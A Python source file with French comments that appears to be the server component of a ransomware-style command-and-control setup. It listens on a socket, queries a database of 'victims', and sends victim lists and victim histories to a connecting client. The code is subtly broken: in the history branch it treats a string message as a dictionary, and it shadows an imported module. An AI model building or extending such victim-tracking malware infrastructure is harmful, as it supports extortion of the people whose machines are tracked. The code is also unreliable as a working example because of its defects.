import utile.message
import utile.network as network
import utile.data as data
from utile import message
import socket

def main():
    connexion_db = data.connect_db()
    server_socket = network.start_net_serv()

    # Boucle pour maintenir le serveur en écoute indéfiniment
    while True:
        # Accepter une nouvelle connexion
        client_socket, client_address = server_socket.accept()
        print(f"Nouvelle connexion entrante de {client_address}")

        # Insérer le traitement des données ici
        while True:
            # Recevoir le message du client
            message = network.receive_message(client_socket)
            if not message:
                break

            # Afficher le message reçu
            print(f"Message du client : {message}")
            if message == 'LIST_VICTIM_REQ':
                print('message reçu')
                victims = data.get_list_victims(connexion_db)
                print(victims)

                for victim in victims:
                    # Envoi des messages list_victime_resp
                    msg = utile.message.set_message('list_victim_resp', victim)
                    network.send_message(client_socket, msg)

                # Envoi du message list_victime_end
                msg = utile.message.set_message('list_victim_end')
                network.send_message(client_socket, msg)

            elif message == 'HISTORY_REQ':
                id_victim = message['HIST_REQ']
                histories = data.get_list_history(connexion_db, id_victim)
                for history in histories:
                    # Envoi des messages history_resp
                    msg = utile.message.set_message('history_resp', history)
                    network.send_message(client_socket, msg)

                # Envoi du message history_end
                msg = utile.message.set_message('history_end', [id_victim])
                network.send_message(client_socket, msg)
            else:
                print('Failed ! ')
        # Fermer la connexion avec le client
        client_socket.close()
    # Fermer le socket du serveur une fois que la boucle est terminée
    server_socket.close()
    exit(0)

if __name__ == '__main__':
    main()
